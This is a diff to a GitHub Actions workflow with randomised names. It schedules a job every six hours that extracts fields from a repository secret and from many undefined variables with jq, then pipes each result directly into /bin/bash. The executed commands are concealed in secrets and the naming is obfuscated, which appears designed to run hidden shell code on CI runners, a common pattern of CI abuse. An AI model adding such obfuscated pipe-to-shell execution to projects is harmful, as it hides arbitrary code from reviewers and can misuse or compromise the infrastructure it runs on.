@@ -1,8 +1,10 @@
 name: duoknk
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 0/6 * * *'
+    - cron: '0 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +13,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: duoknk
         env:
-          mcibe42: ${{ secrets.mcibe42 }}
+          ku347: ${{ secrets.ku347 }}
         run: |
-          echo $mcibe42 | jq -r .uezsp6644 | /bin/bash
-          echo $zl1414 | jq -r .j6 | /bin/bash
-          echo $p2 | jq -r .d72530 | /bin/bash
-          echo $mi786 | jq -r .ul5 | /bin/bash
-          echo $ktob0899 | jq -r .ikeq00013 | /bin/bash
-          echo $ummw7 | jq -r .f7 | /bin/bash
-          echo $sqe42 | jq -r .wrffl62 | /bin/bash
-          echo $m97608 | jq -r .fhb41398 | /bin/bash
-          echo $gcb406 | jq -r .cyxch9 | /bin/bash
-          echo $bhlu514 | jq -r .rvoe4118 | /bin/bash
-          echo $zchn55902 | jq -r .j35 | /bin/bash
+          echo $ku347 | jq -r .b0 | /bin/bash
+          echo $q5 | jq -r .hmi315 | /bin/bash
+          echo $it2 | jq -r .lu5 | /bin/bash
+          echo $mia1 | jq -r .byk2216 | /bin/bash
+          echo $d1799 | jq -r .l10479 | /bin/bash
+          echo $xzv362 | jq -r .hyp95 | /bin/bash
+          echo $zkzd6 | jq -r .a32 | /bin/bash
+          echo $ytu96 | jq -r .ub871 | /bin/bash
+          echo $nu08983 | jq -r .e728 | /bin/bash
+          echo $df9 | jq -r .yjpa14 | /bin/bash
+          echo $rumxd26 | jq -r .el25023 | /bin/bash
+          echo $nyvgb25 | jq -r .gzv91888 | /bin/bash
 
